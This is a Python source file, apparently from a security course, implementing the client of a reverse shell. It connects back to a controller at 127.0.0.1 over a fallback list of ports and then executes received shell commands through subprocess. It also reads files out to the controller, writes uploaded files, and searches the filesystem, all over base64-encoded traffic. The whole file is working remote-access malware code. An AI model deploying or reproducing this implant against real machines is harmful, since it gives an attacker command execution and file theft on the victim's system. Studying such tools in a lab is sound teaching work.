# NAME: Robert Hendrickson
# ID:   instructor05
# DATE: 10-07-2021

import base64
import getpass
import os
import socket
import subprocess
import sys
import time

start_loc = os.getcwd()


def mysendall(socket, data, delimiter):
    E_data = base64.b64encode(data) + delimiter
    return socket.sendall(E_data)


def myrecvall(socket, delimiter):
    data = b''
    while not data.endswith(delimiter):
        data += socket.recv(4096)
    D_data = base64.b64decode(data[:-len(delimiter)])
    return D_data


def download(socket, delimiter):
    data = "[!] Ready for file name.".encode()
    mysendall(socket, data, delimiter)
    filename = myrecvall(socket, delimiter).decode()
    try:
        with open(filename, 'r') as handle:
            data = handle.read()
    except Exception as e:
        typee = str(type(e)).split()[1].split('>')[0]
        data = '[!] ERROR TYPE: {} \n    --ERROR:{}'.format(typee, str(e)).encode()
        mysendall(socket, data, delimiter)
        myrecvall(socket, delimiter).decode()
        data = '[!] Client download failed'.encode()
        mysendall(socket, data, delimiter)
    else:
        data = data.encode()
        mysendall(socket, data, delimiter)
        myrecvall(socket, delimiter).decode()
        data = '[!] Client download complete'.encode()
        mysendall(socket, data, delimiter)


def search(socket, delimiter):
    data = '[!] Starting Search'.encode()
    mysendall(socket, data, delimiter)
    if 'serch' not in os.listdir():
        sys.path.append(start_loc)
        import hapy_serchNFJC
    else:
        import hapy_serchNFJC
    filepath = myrecvall(socket, delimiter).decode()
    data = '[!] File path received at client'.encode()
    mysendall(socket, data, delimiter)
    known = myrecvall(socket, delimiter).decode() 
    if known.startswith('y'):
        known = True
        data = '[!] Ready for file name'.encode()
        mysendall(socket, data, delimiter)
        name = myrecvall(socket, delimiter).decode().strip()
    elif known.startswith('n'):
        known = False
        name = False
        data = '[!] No file name, using default pattern'.encode()
        mysendall(socket, data, delimiter)
        myrecvall(socket, delimiter).decode()
    try:
        results = hapy_serchNFJC.searcher(filepath, known, name, sys.platform)
    except Exception as e:
        typee = str(type(e)).split()[1].split('>')[0]
        data = '[!] ERROR TYPE: {} \n    --ERROR:{}'.format(typee,str(e)).encode()
        mysendall(socket, data, delimiter)
        myrecvall(socket, delimiter).decode()
        data = '[!] Client search failed'.encode()
        mysendall(socket, data, delimiter)
    else:
        if len(results):
            data = str(len(results)).encode()
            mysendall(socket, data, delimiter)
            myrecvall(socket, delimiter).decode() 
            for i in results:
                mysendall(socket, str(i).encode(), delimiter)
                myrecvall(socket, delimiter).decode()
            data = '[!] Client search complete'.encode()
            mysendall(socket, data, delimiter)
        else:
            data = '[!] No results found'.encode()
            mysendall(socket, data, delimiter)
            myrecvall(socket, delimiter).decode()
            data = '[!] Client search complete'.encode()
            mysendall(socket, data, delimiter)


def multi(socket, delimiter):
    command = ''
    while command != 'back':
        user = getpass.getuser()
        user_dir = os.getcwd()
        data = user+';'+user_dir
        data = data.encode()
        mysendall(socket, data, delimiter)
        command = myrecvall(socket, delimiter).decode()
        if command[:4] == 'back':
            break
        else:
            commandant(socket, delimiter)
            continue


def commandant(socket, delimiter):
    user = getpass.getuser()
    data = '[!] Client received command'.encode()
    mysendall(socket, data, delimiter)  
    command = myrecvall(socket, delimiter).decode()
    if command[:2] == 'cd':
        command = command.strip()
        try:
            commandloc = command.split(' ')[1]
            if '~' in commandloc:
                if sys.platform.startswith('linux'):
                    commandloc = '/home/{}'.format(user)
                elif sys.platform.startswith('win'):
                    commandloc = 'C:\\Users\\{}'.format(user)
        except IndexError as ie:
            data = '[!] Changing to default directory'.encode()
            mysendall(socket, data, delimiter)  
            if sys.platform.startswith('linux'):
                os.chdir('/home/{}'.format(user))
            elif sys.platform.startswith('win'):
                os.chdir('C:\\Users\\{}'.format(user))
            myrecvall(socket, delimiter).decode()  
            data = '[!] Changed directory to: {}'.format(os.getcwd()).encode()
            mysendall(socket, data, delimiter)  
        except Exception as e:
            data = '[!] ERROR: {}'.format(str(e)).encode()
            mysendall(socket, data, delimiter)
            myrecvall(socket, delimiter).decode()
            data = '[!] Client command failed'.encode()
            mysendall(socket, data, delimiter)
        else:
            os.chdir(commandloc)
            data = '[!] Changed directory to: {}'.format(os.getcwd()).encode()
            mysendall(socket, data, delimiter)
            myrecvall(socket, delimiter).decode()
            data = '[!] Client command complete'.encode()
            mysendall(socket, data, delimiter)
    elif command[:4] == 'back': 
        data = '[!] Received back command'.encode()
        mysendall(socket, data, delimiter)
        myrecvall(socket, delimiter).decode()
        data = '[!] Exiting command loop'.encode()
        mysendall(socket, data, delimiter)
    else: 
        proc = subprocess.Popen(command,
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        output, errors = proc.communicate()
        if not len(output):
            output = '[!] No command output at client'.encode()
        results = output + errors
        mysendall(socket, results, delimiter)
        myrecvall(socket, delimiter).decode()
        data = "[!] Client command complete".encode()
        mysendall(socket, data, delimiter)


def upload(socket, delimiter):
    target_name = myrecvall(socket, delimiter).decode().strip()
    data = '[!] Ready for file contents.'.encode()
    mysendall(socket, data, delimiter)
    D_recvd = myrecvall(socket, delimiter).decode()
    try:
        with open(target_name, 'w') as handle:
            handle.write(D_recvd)
    except Exception as e:
        type_e = str(type(e)).split()[1].split('<')[0]
        data = '[!] Upload function error:\n    --ERROR TYPE: {}\n    --ERROR: \n{}'.format(type_e, str(e)).encode()
        mysendall(socket, data, delimiter)
        myrecvall(socket, delimiter).decode()
        data = '[!] Client upload failed'.encode()
        mysendall(socket, data, delimiter)
    else:
        data = '[!] File uploaded to client at: {}'.format(target_name).encode()
        mysendall(socket, data, delimiter)
        myrecvall(socket, delimiter).decode()
        data = '[!] Client upload complete'.encode()
        mysendall(socket, data, delimiter)


def main():
    ip = '127.0.0.1'
    ports = [8888, 7777, 6666, 5555]
    delimiter = b'!!@@##$$!!'
    mysocket = socket.socket()
    connected = False
    while not connected:
        for port in ports:
            time.sleep(1)
            try:
                mysocket.connect((ip, port))
            except socket.error:
                continue
            except KeyboardInterrupt:
                sys.exit()
            else:
                connected = True
                break
    while True:
        user = getpass.getuser()
        user_dir = os.getcwd()
        data = user+';'+user_dir
        data = data.encode()
        mysendall(mysocket, data, delimiter)
        command = myrecvall(mysocket, delimiter).decode()
        breaklist = ['dc','qt','ex']
        if command.strip() in breaklist:
            data = '[!] Connection terminated at client'.encode()
            mysendall(mysocket, data, delimiter)
            break
        elif command[:2] == 'dl':
            download(mysocket, delimiter)
            continue
        elif command[:3] == 'src':
            search(mysocket, delimiter)
            continue
        elif command[:2] == 'ul':
            upload(mysocket, delimiter)
            continue
        elif command[:3] == 'cmd':
            data = '[!] Client ready for commands'.encode()
            mysendall(mysocket, data, delimiter)
            ask = myrecvall(mysocket, delimiter).decode()
            if ask.strip() == 's':
                commandant(mysocket, delimiter)
                continue
            elif ask.strip() == 'm':
                multi(mysocket, delimiter)
                continue


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
